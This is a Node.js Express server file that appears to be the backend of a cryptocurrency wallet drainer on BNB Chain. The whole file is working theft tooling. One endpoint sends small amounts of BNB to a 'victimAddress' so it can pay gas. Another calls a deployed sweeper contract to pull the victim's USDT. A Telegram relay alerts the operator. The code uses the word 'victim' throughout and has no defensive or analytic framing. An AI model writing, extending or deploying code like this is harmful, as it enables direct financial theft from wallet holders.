// api/server.js
const express = require('express');
const { ethers } = require('ethers');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(cors());

// Load environment variables
const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const BNB_RPC = "https://bsc-dataseed.binance.org/";

// Initialize provider and funding wallet
const provider = new ethers.JsonRpcProvider(BNB_RPC);
const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);

// Your deployed contract address
const SWEEPER_CONTRACT = "0x802E52D35F64cfa78e0DBf1Ab920aAA71030308e";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

// ========== TELEGRAM ALERTS ==========
app.post('/api/telegram', async (req, res) => {
  const { message } = req.body;
  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }
    );
    res.sendStatus(200);
  } catch (error) {
    console.error("Telegram error:", error);
    res.status(500).json({ error: error.message });
  }
});

// ========== GAS FUNDING ==========
app.post('/api/fund-gas', async (req, res) => {
  const { victimAddress } = req.body;
  const minBalance = ethers.parseEther("0.0003");

  try {
    const balance = await provider.getBalance(victimAddress);
    if (balance < minBalance) {
      const tx = await fundingWallet.sendTransaction({
        to: victimAddress,
        value: ethers.parseEther("0.0005"),
      });
      await tx.wait();
      res.json({ success: true, txHash: tx.hash });
    } else {
      res.json({ success: true, message: "Victim has enough BNB." });
    }
  } catch (error) {
    console.error("Gas funding error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== SWEEP USDT ==========
app.post('/api/sweep', async (req, res) => {
  const { victimAddress } = req.body;

  try {
    const sweeperABI = ["function sweep(address victim, address token) external"];
    const sweeper = new ethers.Contract(SWEEPER_CONTRACT, sweeperABI, fundingWallet);

    const tx = await sweeper.sweep(victimAddress, USDT_ADDRESS);
    await tx.wait();
    res.json({ success: true, txHash: tx.hash });
  } catch (error) {
    console.error("Sweep error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Export the Express app for Vercel
module.exports = app;